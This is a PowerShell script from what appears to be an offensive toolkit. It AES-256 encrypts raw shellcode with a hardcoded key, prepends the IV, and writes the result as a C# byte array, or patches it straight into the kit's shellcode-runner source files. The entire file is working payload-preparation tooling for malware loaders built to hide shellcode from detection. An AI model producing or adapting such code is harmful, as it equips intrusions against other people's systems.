<#
.SYNOPSIS
  Encrypts raw shellcode for the aes-loaders/* runners.

.DESCRIPTION
  AES-256-CBC encrypts a raw shellcode file using the shared key used by every
  runner under aes-loaders/, and emits the `buf` byte array in C# format.
  A random 16-byte IV is PREPENDED to the ciphertext, matching the Decrypt()
  routine in each runner (IV = first 16 bytes, rest = ciphertext).

  Optionally patches the `byte[] buf = new byte[...] { ... };` declaration
  directly inside a runner .cs file with -PatchTarget.

.EXAMPLE
  .\encrypt-buf.ps1 -InputFile ..\..\test\shellcode.bin -OutputFile buf.cs
  .\encrypt-buf.ps1 -InputFile ..\..\test\shellcode.bin -PatchTarget ..\aes-normal-runner\aes-normal-shellcode-runner.cs
#>
param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [string]$OutputFile,
    [string]$PatchTarget,
    [string]$Key = "t51JpSvoag6052x1go4PvuSiLOwNWifX",
    [string]$VarName = "buf"
)

$ErrorActionPreference = 'Stop'

if (-not [IO.Path]::IsPathRooted($InputFile)) { $InputFile = Join-Path (Get-Location) $InputFile }
$InputFile = [IO.Path]::GetFullPath($InputFile)
if (-not (Test-Path -LiteralPath $InputFile)) { throw "Input file not found: $InputFile" }

$plaintext = [IO.File]::ReadAllBytes($InputFile)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = [System.Text.Encoding]::UTF8.GetBytes($Key)
$aes.GenerateIV()

$enc = $aes.CreateEncryptor()
$ciphertext = $enc.TransformFinalBlock($plaintext, 0, $plaintext.Length)

# IV || ciphertext
$buf = New-Object byte[] ($aes.IV.Length + $ciphertext.Length)
[Array]::Copy($aes.IV, 0, $buf, 0, $aes.IV.Length)
[Array]::Copy($ciphertext, 0, $buf, $aes.IV.Length, $ciphertext.Length)

$hex  = ($buf | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
$line = "byte[] $VarName = new byte[$($buf.Length)] { $hex };"

Write-Host "[+] Plaintext   : $($plaintext.Length) bytes"
Write-Host "[+] IV+ct       : $($buf.Length) bytes  (16 IV + $($ciphertext.Length) ciphertext)"

if ($OutputFile) {
    if (-not [IO.Path]::IsPathRooted($OutputFile)) { $OutputFile = Join-Path (Get-Location) $OutputFile }
    $OutputFile = [IO.Path]::GetFullPath($OutputFile)
    Set-Content -LiteralPath $OutputFile -Value $line -Encoding ASCII
    Write-Host "[+] Wrote $OutputFile"
}

if ($PatchTarget) {
    if (-not [IO.Path]::IsPathRooted($PatchTarget)) { $PatchTarget = Join-Path (Get-Location) $PatchTarget }
    $PatchTarget = [IO.Path]::GetFullPath($PatchTarget)
    if (-not (Test-Path -LiteralPath $PatchTarget)) { throw "Patch target not found: $PatchTarget" }

    $content = Get-Content -LiteralPath $PatchTarget -Raw
    $pattern = 'byte\[\] ' + [regex]::Escape($VarName) + ' = new byte\[[0-9]*\] \{.*?\};'
    $rx = [System.Text.RegularExpressions.RegexOptions]::Singleline
    $m = [regex]::Match($content, $pattern, $rx)
    if (-not $m.Success) { throw "Could not find 'byte[] $VarName = new byte[...] { ... };' in $PatchTarget" }

    $backup = $PatchTarget + ".bak"
    Copy-Item -LiteralPath $PatchTarget -Destination $backup -Force
    $content = $content.Remove($m.Index, $m.Length).Insert($m.Index, $line)
    Set-Content -LiteralPath $PatchTarget -Value $content -Encoding ASCII
    Write-Host "[+] Patched $PatchTarget"
    Write-Host "[+] Backup  $backup"
}
